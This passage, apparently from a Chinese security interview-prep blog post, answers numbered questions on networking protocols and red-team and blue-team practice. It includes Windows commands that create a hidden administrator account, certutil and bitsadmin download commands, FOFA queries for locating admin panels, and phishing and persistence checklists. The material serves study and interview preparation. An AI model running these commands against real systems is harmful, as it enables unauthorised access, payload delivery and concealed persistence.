只能作为一种辅助手段，而不是最主要的解决方案。 referer识别。在HTTP Header中有一个字段Referer，它记录了HTTP请求的来源地址。如果Referer是 其他网站，就有可能是CSRF攻击，则拒绝该请求。但是，服务器并非都能取到Referer。很多用户出于 隐私保护的考虑，限制了Referer的发送。在某些情况下，浏览器也不会发送Referer，例如HTTPS跳转 到HTTP。 验证请求来源地址； 关键操作添加验证码； 在请求地址添加 token 并验证。 74.什么是文件上传漏洞文件上传漏洞，指的是用户上传一个可执行的脚本文件，并通过此脚本文件获得了执行服务端命令的能 力。 许多第三方框架、服务，都曾经被爆出文件上传漏洞，比如很早之前的Struts2，以及富文本编辑器等 等，可被攻击者上传恶意代码，有可能服务端就被人黑了。 如何防范文件上传漏洞 文件上传的目录设置为不可执行。 判断文件类型。在判断文件类型的时候，可以结合使用MIME Type，后缀检查等方式。因为对于上 传文件，不能简单地通过后缀名称来判断文件的类型，因为攻击者可以将可执行文件的后缀名称改为图 片或其他后缀类型，诱导用户执行。 对上传的文件类型进行白名单校验，只允许上传可靠类型。 上传的文件需要进行重新命名，使攻击者无法猜想上传文件的访问路径，将极大地增加攻击成本，同 时向shell.php.rar.ara这种文件，因为重命名而无法成功实施攻击。 限制上传文件的大小。 单独设置文件服务器的域名。 75.DDos 攻击客户端向服务端发送请求链接数据包，服务端向客户端发送确认数据包，客户端不向服务端发送确认数 据包，服务器一直等待来自客户端的确认 没有彻底根治的办法，除非不使用TCP DDos - 预防： 限制同时打开SYN半链接的数目 缩短SYN半链接的Time out 时间 关闭不必要的服务 76.重要协议分布图 77.arp协议的工作原理 地址解析协议，即ARP（Address Resolution Protocol），是根据IP地址获取物理地址的一个TCP&#x2F;IP协议。 发送ARP请求的以太网数据帧 广播 到以太网上的每个主机，ARP请求帧中包含了目的主机的IP地址。 目的主机收到了该ARP请求之后，会发送一个ARP应答，里面包含了目的主机的MAC地址。 ARP协议工作原理： 每个主机都会在自己的 ARP 缓冲区中建立一个 ARP 列表，以表示 IP 地址和 MAC 地址之间的对应关系。 主机（网络接口）新加入网络时（也可能只是mac地址发生变化，接口重启等），会发送免费ARP报文把自己IP地址与Mac地址的映射关系广播给其他主机。 网络上的主机接收到免费ARP报文时，会更新自己的ARP缓冲区。将新的映射关系更新到自己的ARP表 中。 某个主机需要发送报文时，首先检查 ARP 列表中是否有对应 IP 地址的目的主机的 MAC 地址，如果有， 则直接发送数据，如果没有，就向本网段的所有主机发送 ARP 数据包，该数据包包括的内容有：源主机 IP 地址，源主机 MAC 地址，目的主机的 IP 地址等。 当本网络的所有主机收到该 ARP 数据包时： 首先检查数据包中的 IP 地址是否是自己的 IP 地址，如果不是，则忽略该数据包。 如果是，则首先从数据包中取出源主机的 IP 和 MAC 地址写入到 ARP 列表中，如果已经存在，则 覆盖。 然后将自己的 MAC 地址写入 ARP 响应包中，告诉源主机自己是它想要找的 MAC 地址。 6.源主机收到 ARP 响应包后。将目的主机的 IP 和 MAC 地址写入 ARP 列表，并利用此信息发送数据。 如果源主机一直没有收到 ARP 响应数据包，表示 ARP 查询失败。ARP高速缓存（即ARP表）是 ARP地址 解析协议能够高效运行的关键 78.什么是RARP？工作原理 概括： 反向地址转换协议，网络层协议，RARP与ARP工作方式相反。 RARP使只知道自己硬件地址的主 机能够知道其IP地址。RARP发出要反向解释的物理地址并希望返回其IP地址，应答包括能够提供所需信 息的RARP服务器发出的IP地址。 原理： 网络上的每台设备都会有一个独一无二的硬件地址，通常是由设备厂商分配的MAC地址。主机从网卡 上读取MAC地址，然后在网络上发送一个RARP请求的广播数据包，请求RARP服务器回复该主机的IP地 址。 RARP服务器收到了RARP请求数据包，为其分配IP地址，并将RARP回应发送给主机 PC1收到RARP回应后，就使用得到的IP地址进行通讯。 79.dns是什么？dns的工作原理将主机域名转换为ip地址，属于应用层协议，使用UDP传输。（DNS应用层协议，以前有个考官问过） 过程： 总结： 浏览器缓存，系统缓存，路由器缓存，IPS服务器缓存，根域名服务器缓存，顶级域名服务器缓 存，主域名服务器缓存。 主机向本地域名服务器的查询一般都是采用递归查询。 本地域名服务器向根域名服务器的查询的迭代查询。 当用户输入域名时，浏览器先检查自己的缓存中是否 这个域名映射的ip地址，有解析结束。 若没命中，则检查操作系统缓存（如Windows的hosts）中有没有解析过的结果，有解析结束。 若无命中，则请求本地域名服务器解析（ LDNS）。 若LDNS没有命中就直接跳到根域名服务器请求解析。根域名服务器返回给LDNS一个 主域名服务器 地址。 此时LDNS再发送请求给上一步返回的gTLD（ 通用顶级域）， 接受请求的gTLD查找并返回这个域名 对应的Name Server的地址 Name Server根据映射关系表找到目标ip，返回给LDNS LDNS缓存这个域名和对应的ip， 把解析的结果返回给用户，用户根据TTL值缓存到本地系统缓存 中，域名解析过程至此结束 80.rip协议是什么？rip的工作原理RIP动态路由选择协议（网络层协议） RIP是一种基于距离矢量（Distance-Vector）算法的协议，它使用跳数（Hop Count）作为度量来衡量 到达目的网络的路由距离。RIP通过UDP报文进行路由信息的交换，使用的端口号520。 工作原理： RIP路由协议用“更新（UNPDATES）”和“请求（REQUESTS）”这两种分组来传输信息的。每个具有RIP协 议功能的路由器每隔30秒用UDP520端口给与之直接相连的机器广播更新信息。并且在（ 用“路程段数” （即“跳数”）作为网络距离的尺度。每个路由器在）给相邻路由器发出路由信息时，都会给每个路径加 上内部距离。 **路由器的收敛机制： ** 任何距离向量路由选择协议（如RIP）都有一个问题，路由器不知道网络的全局情况，路由器必须依靠相 邻路由器来获取网络的可达信息。由于路由选择更新信息在网络上传播慢，距离向量路由选择算法有一 个慢收敛问题，这个问题将导致不一致性产生。 RIP较少路由收敛机制带来的问题： 记数到无穷大机制： RIP协议允许最大跳数为15。大于15的目的地被认为是不可达。 当路径的跳数 超过15，这条路径才从路由表中删除。 水平分割法： 路由器不向路径到来的方向回传此路径。当打开路由器接口后，路由器记录路径是从 哪个接口来的，并且不向此接口回传此路径。 破坏逆转的水平分割法： 忽略在更新过程中从一个路由器获取的路径又传回该路由器 保持定时器法： 防止路由器在路径从路由表中删除后一定的时间内（通常为180秒）接受新的路由信 息。 保证每个路由器都收到了路径不可达信息 触发更新法： 当某个路径的跳数改变了，路由器立即发出更新信息，不管路由器是否到达常规信息 更新时间都发出更新信息。 81.RIP的缺点 由于15跳为最大值，RIP只能应用于小规模网络 收敛速度慢 根据跳数选择的路由，不一定是最优路由 82.OSPF协议？ OSPF的工作原理OSPF（Open Shortest Pass First,开放最短路径优先协议），是一个最常用的内部网管协议，是一个链 路状态协议。(网络层协议,) 原理： ​\tOSPF组播的方式在所有开启OSPF的接口发送Hello包，用来确定是否有OSPF邻居，若发现了，则建立 OSPF邻居关系，形成邻居表，之后互相发送LSA（链路状态通告）相互通告路由，形成LSDB（链路状态 数据库）。再通过SPF算法，计算最佳路径（cost最小）后放入路由表。 83.TCP与UDP区别总结 TCP面向连接（如打电话要先拨号建立连接）提供可靠的服务;UDP是无连接的，即发送数据之前不需 要建立连接，;UDP尽最大努力交付，即不保证可靠交付。（由于UDP无需建立连接，因此UDP不会引入 建立连接的时延，TCP需要在端系统中维护连接状态，比如接受和发送缓存，拥塞控制，序号与确认号 的参数等，故TCP会比UDP慢） UDP具有较好的实时性，工作效率比TCP高，适用于对高速传输和实时性有较高的通信或广播通信。 每一条TCP连接只能是一对一的;UDP支持一对一，一对多，多对一和多对多的交互通 UDP分组首部开销小，TCP首部开销20字节;UDP的首部开销小，只有8个字节。 TCP面向字节流，实际上是TCP把数据看成一连串无结构的字节流;UDP是面向报文的（一次交付一 个完整的报文，报文不可分割，报文是UDP数据报处理的最小单位）。 UDP适合一次性传输较小数据的网络应用，如DNS，SNMP等 84.什么是三次握手四次挥手？tcp为什么要三次握手？为了防止已失效的连接请求报文段突然又传送到了服务端，因而产生错误 第一次握手：建立连接时，客户端发送syn包(syn&#x3D;j)到服务器，并进入SYN_SEND状态，等待服务器确认； 第二次握手：服务器收到syn包，必须确认客户的SYN（ack&#x3D;j+1），同时自己也发送一个SYN包 （syn&#x3D;k），即SYN+ACK包，此时服务器进入SYN_RECV状态； 第三次握手：客户端收到服务器的SYN＋ACK包，向服务器发送确认包ACK(ack&#x3D;k+1)，此包发送完毕， 客户端和服务器进入ESTABLISHED状态，完成三次握手。 完成三次握手，客户端与服务器开始传送数据 客户端先发送FIN，进入FIN_WAIT1状态，用来关闭Client到Server的数据传送 服务端收到FIN，发送ACK，进入CLOSE_WAIT状态，客户端收到这个ACK，进入FIN_WAIT2状态 服务端发送FIN，进入LAST_ACK状态，用来关闭Server到Client的数据传送 客户端收到FIN，发送ACK，进入TIME_WAIT状态，服务端收到ACK，进入CLOSE状态（等待2MSL时 间，约4分钟。主要是防止最后一个ACK丢失。） 第一次挥手：主动关闭方发送一个FIN，用来关闭主动方到被动关闭方的数据传送，也就是主动关闭方告 诉被动关闭方：我已经不 会再给你发数据了(当然，在fin包之前发送出去的数据，如果没有收到对应的 ack确认报文，主动关闭方依然会重发这些数据)，但是，此时主动关闭方还可 以接受数据。 第二次挥手：被动关闭方收到FIN包后，发送一个ACK给对方，确认序号为收到序号+1（与SYN相同，一 个FIN占用一个序号）。 第三次挥手：被动关闭方发送一个FIN，用来关闭被动关闭方到主动关闭方的数据传送，也就是告诉主动 关闭方，我的数据也发送完了，不会再给你发数据了。 第四次挥手：主动关闭方收到FIN后，发送一个ACK给被动关闭方，确认序号为收到序号+1，至此，完成 四次挥手 85.GET 和 POST 的区别get是获取数据，post是修改数据 get把请求的数据放在url上， 以?分割URL和传输数据，参数之间以&amp;相连，所以get不太安全。而post把 数据放在HTTP的包体内（requrest body） get提交的数据最大是2k（ 限制实际上取决于浏览器）， post理论上没有限制。 GET产生一个TCP数据包，浏览器会把http header和data一并发送出去，服务器响应200(返回数据); POST产生两个TCP数据包，浏览器先发送header，服务器响应100 -continue，浏览器再发送data，服务器响应200 ok(返回数据)。 GET请求会被浏览器主动缓存，而POST不会，除非手动设置。 GET是幂等的，而POST不是幂等的 86.Cookies和session区别Cookie和Session都是客户端与服务器之间保持状态的解决方案 存储的位置不同，cookie：存放在客户端，session：存放在服务端。Session存储的数据比较安全 存储的数据类型不同 两者都是key-value的结构，但针对value的类型是有差异的cookie：value只能是字符串类型，session：value是Object类型 存储的数据大小限制不同 cookie：大小受浏览器的限制，很多是是4K的大小， session：理论上受当前内存的限制， 生命周期的控制 cookie的生命周期当浏览器关闭的时候，就消亡了 cookie的生命周期是累计的，从创建时，就开始计时，20分钟后，cookie生命周期结束， session的生命周期是间隔的，从创建时，开始计时如在20分钟，没有访问session，那么session生 命周期被销毁 87.session 的工作原理？session 的工作原理是客户端登录完成之后，服务器会创建对应的 session，session 创建完之后，会把 session 的 id 发送给客户端，客户端再存储到浏览器中。这样客户端每次访问服务器时，都会带着 sessionid，服务器拿到 sessionid 之后，在内存找到与之对应的 session 这样就可以正常工作了。 88.一次完整的HTTP请求过程域名解析 –&gt; 发起TCP的3次握手 –&gt; 建立TCP连接后发起http请求 –&gt; 服务器响应http请求，浏览器得到 html代码 –&gt; 浏览器解析html代码，并请求html代码中的资源（如js、css、图片等） –&gt; 浏览器对页面 进行渲染呈现给用户。 89.HTTPS和HTTP的区别 HTTP协议传输的数据都是未加密的，也就是明文的，因此使用HTTP协议传输隐私信息非常不安全， HTTPS协议是由SSL+HTTP协议构建的可进行加密传输、身份认证的网络协议，要比http协议安全。 https协议需要到ca申请证书，一般免费证书较少，因而需要一定费用。 http和https使用的是完全不同的连接方式，用的端口也不一样，前者是80，后者是443。 https://www.cnblogs.com/wqhwe/p/5407468.html 90.OSI 的七层模型都有哪些？ 物理层：利用传输介质为数据链路层提供物理连接，实现比特流的透明传输。 数据链路层：接收来自物理层的位流形式的数据，并封装成帧，传送到上一层 网络层：将网络地址翻译成对应的物理地址，并通过路由选择算法为分组通过通信子网选择最适当的路径。 传输层：在源端与目的端之间提供可靠的透明数据传输 会话层：负责在网络中的两节点之间建立、维持和终止通信 表示层：处理用户信息的表示问题，数据的编码，压缩和解压缩，数据的加密和解密 应用层：为用户的应用进程提供网络通信服务 91.http长连接和短连接的区别在HTTP&#x2F;1.0中默认使用短连接。也就是说，客户端和服务器每进行一次HTTP操作，就建立一次连接， 任务结束就中断连接。而从HTTP&#x2F;1.1起，默认使用长连接，用以保持连接特性。 92.什么是TCP粘包&#x2F;拆包？ 发生原因？解决方案一个完整的业务可能会被TCP拆分成多个包进行发送，也有可能把多个小的包封装 成一个大的数据包发送，这个就是TCP的拆包和粘包问题。 原因： 1. 应用程序写入数据的字节大小大于 套接字发送缓冲区的大小. 1. 进行MSS大小的TCP分段。( MSS&#x3D;TCP报文段长度-TCP首部长度) 1. 以太网的 payload大于MTU进行IP分片。（ MTU指：一种通信协议的某一层上面所能通过的最大数据包大小。） 解决方案： 1. 消息定长。 2. 在包尾部增加回车或者空格符等特殊字符进行分割 3. 将消息分为消息头和消 息尾。 4. 使用其它复杂的协议，如RTMP协议等。 93.TCP如何保证可靠传输？ 三次握手。 将数据截断为合理的长度。应用数据被分割成 TCP 认为最适合发送的数据块（按字节编号，合理分片） 超时重发。当 TCP 发出一个段后，它启动一个定时器，如果不能及时收到一个确认就重发 确认应答：对于收到的请求，给出确认响应 校验和：校验出包有错，丢弃报文段，不给出响应 序列号：对失序数据进行重新排序，然后才交给应用层 丢弃重复数据：对于重复数据 ， 能够丢弃重复数据 流量控制。TCP 连接的每一方都有固定大小的缓冲空间。TCP 的接收端只允许另一端发送接收端缓冲区所能接纳的数据。这将防止较快主机致使较慢主机的缓冲区溢出。 拥塞控制。当网络拥塞时，减少数据的发送。校验和序列号确认应答超时重传连接管理流量控制拥塞控制 94.常见的状态码有哪些？ 200 OK &#x2F;&#x2F;客户端请求成功403 Forbidden &#x2F;&#x2F;服务器收到请求，但是拒绝提供服务 404 Not Found &#x2F;&#x2F;请求资源不存在，eg：输入了错误的URL 500 Internal Server Error &#x2F;&#x2F;服务器发生不可预期的错误URI和URL的区别URI，统一资源标识符，用来唯 一的标识一个资源。URL可以用来标识一个资源，而且还指明了如何定位这个资源。 95.什么是SSL ？https是如何保证数据传输的安全（SSL是怎么工作 保证安全的） SSL代表安全套接字层。它是一种用于加密和验证应用程序（如浏览器）和Web服务器之间发送的数据的协议。 身份验证 ， 加密Https的加密机制是一种共享密钥加密和公开密钥加密并用的混合加密机制。 SSL&#x2F;TLS协议作用：认证用户和服务，加密数据，维护数据的完整性的应用层协议加密和解密需要两个不 同的密钥，故被称为非对称加密；加密和解密都使用同一个密钥的 对称加密。 优点在于加密、解密效率 通常比较高HTTPS 是基于非对称加密的， 公钥是公开的。 客户端向服务器端发起SSL连接请求； 服务器把公钥发送给客户端，并且服务器端保存着唯一的私钥 客户端用公钥对双方通信的对称秘钥进行加密，并发送给服务器端 服务器利用自己唯一的私钥对客户端发来的对称秘钥进行解密， 进行数据传输，服务器和客户端双方用公有的相同的对称秘钥对数据进行加密解密，可以保证在数 据收发过程中的安全，即是第三方获得数据包，也无法对其进行加密，解密和篡改。 因为数字签名、摘要是证书防伪非常关键的武器。 “摘要”就是对传输的内容，通过hash算法计算出一段 固定长度的串。然后，在通过CA的私钥对这段摘要进行加密，加密后得到的结果就是“数字签名” SSL&#x2F;TLS协议的基本思路是采用公钥加密法，也就是说，客户端先向服务器端索要公钥，然后用公钥加密 信息，服务器收到密文后，用自己的私钥解密。 96.如何保证公钥不被篡改将公钥放在数字证书中。只要证书是可信的，公钥就是可信的。 公钥加密计算量太大，如何减少耗用的时间？ 每一次对话（session），客户端和服务器端都生成一个”对话密钥”（session key），用它来加密信息。 由于”对话密钥”是对称加密，所以运算速度非常快，而服务器公钥只用于加密”对话密钥”本身，这样就减 少了加密运算的消耗时间。 客户端向服务器端索要并验证公钥。 双方协商生成”对话密钥”。 双方采用”对话密钥”进行加密通信。上面过程的前两步，又称为”握手阶段”（handshake）。 97.算法？了解过什么排序？ 冒泡排序 选择排序 插入排序 98.描述外网打点的流程？ 靶标确认、信息收集、漏洞探测、漏洞利用、权限获取。最终的目的是获取靶标的系统权限&#x2F;关键数据。 在这个过程中，信息收集最为重要。掌握靶标情报越多，后续就会有更多的攻击方式去打点。比如：钓鱼邮件、web 漏洞、边界网络设备漏洞、弱口令等。 小问题：什么是钓鱼网站？网络钓鱼攻击者利用欺骗性的电子邮件和伪造的 Web 站点来进行诈骗活动，受骗者往往会泄露自己的财务数据，如信用卡号、帐户用户名和口令等内容。诈骗者通常会将自己伪装成知名银行、在线零售商和信用卡公司等可信的站点，在所有接触诈骗信息的用户中，有高达 5%的人都会对这些骗局做出响应 。 所用的工具： Wappalyzer ：网站技术识别工具 Goby&#x2F;FOFA：网络安全测试工具，由赵武打造，它能对一个目标企业梳理最全的攻击面信息，能够快速的从一个验证入口点，切换到横向。FOFA（网络空间资产搜索引擎） Masscan：端口扫描 99.举几个 FOFA 在外网打点过程中的使用小技巧？后台挖掘：title&#x3D;“后台”&amp;&amp;body&#x3D;“password’&amp;&amp;host&#x3D;”x.cn” 子域名：title！&#x3D;‘404’&amp;&amp;title！&#x3D;‘302’&amp;&amp;host&#x3D;‘x.cn’ C 段：ip&#x3D;‘x.x.x.x&#x2F;24’&amp;&amp;host&#x3D;‘x.cn’ 框架特征：body&#x3D;‘icon-spring-boot-admin.svg’ 漏洞：body&#x3D;‘index&#x2F;of’「列目录漏洞」 100.如何识别 CND？1、通过 ping 命令，查看回显情况 2、windows 系统环境下，使用 nslookup 进行查询，看返回的域名解析的情况 3、超级 ping 工具，比如”all-tool.cn&#x2F;tools&#x2F;ping“「看 ip 结果」 101.邮件钓鱼的准备工作有哪些?钓鱼邮件，即一种伪造邮件，是指利用伪装的电子邮件，来欺骗收件人点击恶意 URL，或诱导收件人下载带恶意程序的可执行文件。 确定邮件钓鱼的形式：链接、文件 收集目标相关的邮箱 编写钓鱼邮件文案 匿名邮箱 木马免杀测试、钓鱼站点搭建 反溯源 102.判断出靶标的 CMS，对外网打点有什么意义？CMS 是 Content Management System 的缩写，意为“内容管理系统”。 CMS 其实是一个很广泛的称呼，从一般的博客程序，新闻发布程序，到综合性的网站管理程序都可以被称为内容管理系统。 判断当前使用的 CMS 是否存在 Nday，尝试利用公开的 poc、exp 进行测试 根据 CMS 特征关联同 CMS 框架站点，进行敏感备份文件扫描，有可能获得站点备份文件。尝试从CMS 源码进行代码审计，挖掘潜在漏洞。 注: 0-day，就是只有你知道的一个漏洞！ 1-day，就是刚刚公布的漏洞（没有超过一天）。 n-day，就是这个漏洞已经公布出来了 N 天啦！ 103.Apache Log4j2 的漏洞原理是什么？由于 Log4j2 组件在处理程序日志记录时存在 JNDI 注入缺陷，未经授权的攻击者利用该漏洞，可向服务 器发送恶意的数据，触发 log4j2 组件的缺陷，实现目标服务器的任意代码执行，获得目标服务器权限。 104.如何判断靶标站点是 windows&#x2F;linux？ 大小写检测：windows 大小写不敏感，而 linux 大小写敏感。 PING 指令：根据 TTL 值，winodws 一般情况下&gt;100,linux&lt;100 TTL(生存时间值)：该字段指定 IP 包被路由器丢弃之前允许通过的最大网段数量。 105.无法连接服务区3389端口的几种情况？ 3389端口处于关闭状态 远程桌面默认端口被修改 防火墙拦截 处于内网环境 超过了服务器最大的连接性 管理员设置了权限，指定用户才能通过3389端口进行远程桌面访问 （3389 端口是 Windows 2000(2003) Server 远程桌面的服务端口，可以通过这个端口，用”远程桌面”等 连接工具来连接到远程的服务器，如果连接上了，输入系统管理员的用户名和密码后，将变得可以像 操作本机一样操作远程的电脑，因此远程服务器一般都将这个端口修改数值或者关闭） 106.如何建立隐藏用户 net user test$ 123456 &#x2F;add [建立隐藏用户] net localgroup administrators test$ &#x2F;add 107.为什么 Mysql 数据库的站点，无法连接？ 站库分离 3306端口未对外开放（3306是Mysql默认端口） Mysql默认端口被修改 108.文件上传功能的监测点有哪些？ 客户端 Javascript 检测（文件后缀名检测） 服务端检测（MINE 类型检测、文件后缀名、文件格式头） MIME（多用途互联网邮件扩展类型） 服务端 MIME 类型检测是通过检查 http 包的 Content-Type 字段中的值来判断上传文件是否合法的。 109.常见的未授权访问漏洞有哪些？（未授权访问漏洞可以理解为需要安全配置或权限认证的地址、授权页面存在缺陷导致其他用户可以直接访问从而引发重要权限可被操作、数据库或网站目录等敏感信息泄露。） MonggoDB 未授权访问漏洞 redis 未授权访问漏洞 memcached 未授权访问漏洞 JOSS 未授权访问漏洞 VNC 未授权访问漏洞 Docker 未授权访问漏洞 Zookeeper 未授权访问漏洞 Rsync 未授权访问漏 120.代码执行，文件读取，命令执行的函数有哪些？ 文件执行：eval、call_user_func、call_user_array 等 文件读取：fopen()、readfile()、fread()、file()等 命令执行：system()、exec()、shell_exec()、passthru()、pcntl_exec()等 121.正向shell和反向shell的区别是什么？ 正向shell：攻击者连接被攻击机器，可用于攻击者处于内网，被攻击者处于公网（外网） 反向shell：被攻击者主动连接攻击者，可用于攻击者处于外网，被攻击者处在内网 122.正向代理和反向代理的区别？ 正向代理：当客户端无法访问外部资源的时候（百度，谷歌），可以通过一个正向代理去简洁的访问。正向代理就是处于客户端和原始服务器之间的服务器，为了从原始服务器转交请求并制定目标，客户端向代理发送请求并制定目标，然后代理向原始服务器转交请求并将获得的内容返回给客户端 反向代理：反向代理正好相反。对于客户端来说，反向代理就好像目标服务区。并且客户端不需要进行任何设置。客户端向反向代理发送请求，接着反向代理判断请求走向何处，并将请求转交给客户端，使得这些内容就好似他自己一样，一次客户端并不会感知到反向代理后面的服务，也因此不需要客户端做任何设置，只需要把反向代理服务器当成真正的服务器就好了。 正向代理就是代理客户端，为客户端收发请求，使真正客户端对服务器不可见；而反向代理就是代理服务端，为服务器收发请求，使真实服务器对客户端不可见。 123.Web TOP 10 漏洞有哪些？ SQL 注入 失效的身份验证 敏感数据泄露 XML 外部实体 （XXE） 失效的访问控制 安全配置错误 跨站脚本 （XSS） 不安全的反序列化 使用含有已知漏洞的组件 不足的日志记录和监控 124.SQL 注入的种类有哪些？ 按照注入点类型分为：数字型，字符型，搜索型 按照提交方式分为：post型，get型，cookie型，http头 按照执行结果分为：基于报错，基于布尔盲注，基于时间盲注 125.常见的目录扫描工具有那些？御剑，Dirsearch，dirmap，webdirscan 126.windows 常见的提权方法有哪些？ 系统内核溢出漏洞提权 数据库提权 错误的系统配值提权 web中间件漏洞提权 第三方软件提权 127.蚁剑&#x2F;菜刀&#x2F;C刀&#x2F;冰蝎的相同与不相同之处 相同：都是用来连接web shell 的工具 不相同：相比于其他三款，冰蝎有流量动态加密 128.windows 环境下有哪些下载文件的命令？ certutil -urlcache -split -f bitsadmin 「url」 存放路径 powershell 存放路径 129.常见的端口号？攻击点？ ftp：20、21:攻击点：匿名上传下载、嗅探、爆破 ssh：22 爆破 telent：23 攻击点：嗅探、爆破 1433 ：sql server 攻击点：注入、弱口令、爆破 1521:orcel 数据库 攻击点：注入、弱口令、爆破 7001:weblogic 中间件管理 攻击：java 反序列化、弱口令 6379:redis 数据库 攻击：未经授权、弱口令爆破 8080:JBOSS、tomcat 攻击：反序列化、控制台弱口令 8069:zabbix 攻击：远程执行、sql 注入 130.木马驻留系统的方式有哪些？ 注册表 计划任务 服务 启动目录 关联文件类型 131.常用的威胁情报平台有哪些？ 安恒威胁情报中心 奇安信威胁情报中心 绿盟威胁情报中心 等 132.常用的webshell检测工具有那些？ a盾 河马 webshell 百度 webdir 深信服 webshell 133.一般情况下，那些漏洞会被高频被用于打点？ 阿帕奇 shiro 相关漏洞 log4j 上传漏洞 边界网络设备资产+弱口令 fastjson 漏 134.windows常用的命令？ type：显示文件类型 dir：显示当前目录 ipconfig：查看 ip 地址 net user ：查看用户 netstat：查看端口 tasklist：查看进程列表 find：文件中搜索字符串 ping：检测网络连通情况 135.应急响应的基本思路是什么？准备-检测-抑制-根除-恢复-书写报告 准备工作，收集信息:收集告警信息，客户反馈信息，设备主机信息等 检测，判断类型：安全事件类型的判断（钓鱼邮件，webshel，爆破，中毒等） 抑制，控制范围，隔离失陷设备 根除，分析研判，将收集的信息分析 恢复，处置时间类型（进程，文件，邮件，启动项，注册表等） 输出报告 136.Liunx 常用的命令？ cat ：显示文件内容 ls：列出当前目录的内容 ifconfig：查看 IP 地址 whoami：查看当前用户 netstat：查看端口 ps：查看进程列表 grep：文件中搜索字符串 ping：检测网站连接情况 crontal：检查定时任务 137.蓝队常用的反制手段有哪些？ 蜜罐（蜜罐技术本质上是一种对攻击方进行欺骗的技术，通过布置一些作为诱饵的主机、网络服务或者信息，诱使攻击方对它们实施攻击，从而可以对攻击行为进行捕获和分析，了解攻击方所使用的工具与方法，推测攻击意图和动机，能够让防御方清晰地了解他们所面对的安全威胁，并通过技术和管理手段来增强实际系统的安全防护能力。） 对攻击目标进行反渗透（IP 定位，IP端口扫描，web站点扫描） 应用漏洞挖掘，利用（菜刀，Goby，蚁剑） id—-&gt;社交特征关联 钓鱼网站—&gt;后台扫描，xss盲打 木马文件—&gt;同源样本关联—&gt;敏感字符串特侦检测（反钓鱼也逐渐被蓝队重视，通过在服务器上故意放置钓鱼文件，吸引红队主动下载安装，完成反钓鱼）","tags":["网络安全，护网","面试"],"categories":["网络安全知识，题库，面试"]}]